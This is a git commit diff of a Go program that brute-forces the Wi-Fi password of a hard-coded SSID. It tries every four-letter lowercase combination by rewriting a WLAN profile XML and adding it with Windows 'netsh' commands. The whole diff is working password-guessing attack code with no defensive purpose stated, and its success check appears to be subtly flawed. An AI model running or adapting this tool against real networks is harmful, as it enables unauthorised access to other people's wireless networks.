06af3fed51b61b7f75bf12956c0cb17009b50ce2
NikSchaefer <59715513+NikSchaefer@users.noreply.github.com>
2021-03-30 15:18:40 -0500

    Guess Password + OPT(doesn't regenerate file each time)

--- main.go
+++ main.go
@@ -10,76 +10,67 @@ import (
 	"time"
 )
 
+var arr = [...]string{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
+	"n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"}
+
 func main() {
 	start := time.Now()
 
 	name := "sideswipe"
-	found := tryPws(name)
-	if found == "" {
-		fmt.Println("Not Found")
-	}
-	fmt.Println(found, time.Since(start))
+	initalize(name)
+	found, passed := tryPws(name)
+	fmt.Println(found, passed, time.Since(start))
+	connectToNetwork(name)
 }
 
-func tryPws(name string) string {
-	var arr = [...]string{"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
-		"N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"}
-
+func tryPws(name string) (string, bool) {
+	previous := "{password}"
 	for i := 0; i < len(arr); i++ {
 		for j := 0; j < len(arr); j++ {
 			for ii := 0; ii < len(arr); ii++ {
 				for jj := 0; jj < len(arr); jj++ {
 					pw := arr[i] + arr[j] + arr[ii] + arr[jj]
-					if loginToNetwork(name, pw) {
-						return pw
+					if loginToNetwork(name, pw, previous) {
+						return pw, true
 					}
+					previous = pw
 				}
 			}
 		}
 	}
-	return ""
+	return "", false
+}
+func initalize(name string) error {
+	data, err := ioutil.ReadFile("template.xml")
+	must(err)
+	str := string(data)
+	str = strings.Replace(str, "{SSID}", name, 2)
+
+	f, err := os.Create("profile.xml")
+	must(err)
+	f.Write([]byte(str))
+	f.Close()
+	return nil
 }
 
-func loginToNetwork(name, pass string) bool {
-	deleteProfile(name)
-	createFileProfile(name, pass)
-	err := addProfile(name)
-	deleteFileProfile(name)
-	if err != nil {
-		return false
-	}
-	connectToNetwork(name)
-	return true
+func loginToNetwork(name, pass, prev string) bool {
+	createFileProfile(name, pass, prev)
+	err := addProfile()
+	return err == nil
 }
-func addProfile(name string) error {
-	dir, err := os.Getwd()
-	must(err)
-	file := fmt.Sprintf("filename=%s\\_%s.xml", dir, name)
-	_, err = exec.Command(`netsh`, `wlan`, `add`, `profile`, file, `interface="WI-FI"`, `user=current`).Output()
+func addProfile() error {
+	dir, _ := os.Getwd()
+	file := fmt.Sprintf("filename=%s\\profile.xml", dir)
+	_, err := exec.Command(`netsh`, `wlan`, `add`, `profile`, file, `interface="WI-FI"`, `user=current`).Output()
 	return err
 }
 
-func createFileProfile(name, pass string) error {
-	filename := fmt.Sprintf("_%s.xml", name)
-	file, err := os.Create(filename)
-	must(err)
-
+func createFileProfile(name, pass, prev string) {
 	data, err := ioutil.ReadFile("profile.xml")
 	must(err)
-
 	str := string(data)
-	str = strings.Replace(str, "{password}", pass, 1)
-	str = strings.Replace(str, "{SSID}", name, 2)
-
-	file.Write([]byte(str))
-	file.Close()
-	return nil
-}
-func deleteFileProfile(name string) error {
-	filename := fmt.Sprintf("_%s.xml", name)
-	err := os.Remove(filename)
-	must(err)
-	return nil
+	str = strings.Replace(str, prev, pass, 1)
+	os.WriteFile("profile.xml", []byte(str), 0644)
 }
 
 func connectToNetwork(name string) bool {
@@ -88,12 +79,6 @@ func connectToNetwork(name string) bool {
 	must(err)
 	fmt.Print(string(out))
 	return false
-}
-
-func deleteProfile(name string) error {
-	_, err := exec.Command(`netsh`, `wlan`, `delete`, `profile`, name).Output()
-	must(err)
-	return nil
 }
 
 func must(err error) {
